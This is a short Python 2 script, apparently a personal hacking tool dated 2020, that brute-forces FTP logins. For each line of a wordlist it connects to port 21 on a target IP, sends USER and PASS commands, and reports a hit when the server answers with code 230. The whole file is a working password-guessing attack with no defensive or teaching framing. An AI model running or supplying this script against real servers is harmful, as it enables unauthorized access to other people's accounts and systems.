#!/usr/bin/python

#felipesi - 2020

import socket
import sys
import re

if len(sys.argv) != 4:
    print "EXAMPLE: " + sys.argv[0] +" 172.0.0.1 user wordlist.txt"
    sys.exit(1)

ip = sys.argv[1]
user = sys.argv[2]
dic = sys.argv[3]

file = open(dic)
for line in file:
    line = line.strip()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 21))
    s.recv(1024)

    s.send("USER %s\n" %user)
    s.recv(1024)
    s.send("PASS %s\n" %line)
    resp = s.recv(1024)
    s.send("QUIT\n")

    if re.search('230', resp):
        print "[+] SUCCESS - %s:%s [+]"%(user,line)
        break
    else:
        print "[-] FAILED - %s:%s [-]"%(user,line)
